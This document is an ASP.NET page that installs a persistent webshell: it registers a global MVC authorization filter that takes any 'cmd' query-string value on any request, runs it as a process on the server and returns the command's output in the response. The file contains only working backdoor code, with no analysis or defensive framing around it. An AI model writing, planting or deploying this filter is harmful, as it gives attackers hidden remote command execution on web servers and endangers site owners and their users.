<%@ Page Language="c#"%>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Web.Mvc" %>
<script runat="server">
    public class MyAuthFilter : IAuthorizationFilter
    {
        public void OnAuthorization(AuthorizationContext filterContext)
        {
            String cmd = filterContext.HttpContext.Request.QueryString["cmd"];
            if (cmd != null)
            {
                HttpResponseBase response = filterContext.HttpContext.Response;
                Process p = new Process();
                p.StartInfo.FileName = cmd;
                Debug.WriteLine(p.StartInfo.FileName);
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                byte[] data = Encoding.UTF8.GetBytes(p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd());
                response.Write(System.Text.Encoding.Default.GetString(data));
            }

            Debug.WriteLine("Auth filter inject");
        }
    }
</script>

<%
    GlobalFilterCollection globalFilterCollection = GlobalFilters.Filters;
    globalFilterCollection.Add(new MyAuthFilter(), -2);
%>